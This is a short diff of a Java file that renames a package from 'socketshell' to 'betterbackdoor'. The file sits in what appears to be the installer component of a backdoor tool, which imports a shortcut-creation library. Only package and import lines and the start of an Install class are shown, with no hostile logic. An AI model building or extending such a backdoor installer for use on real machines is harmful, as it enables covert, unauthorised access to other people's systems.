@@ -1,9 +1,9 @@
-package com.github.thatcherdev.socketshell.install;
+package com.github.thatcherdev.betterbackdoor.install;
 
 import java.io.File;
 import java.io.PrintWriter;
 import org.apache.commons.io.FileUtils;
-import com.github.thatcherdev.socketshell.backend.Utils;
+import com.github.thatcherdev.betterbackdoor.backend.Utils;
 import mslinks.ShellLink;
 
 public class Install {
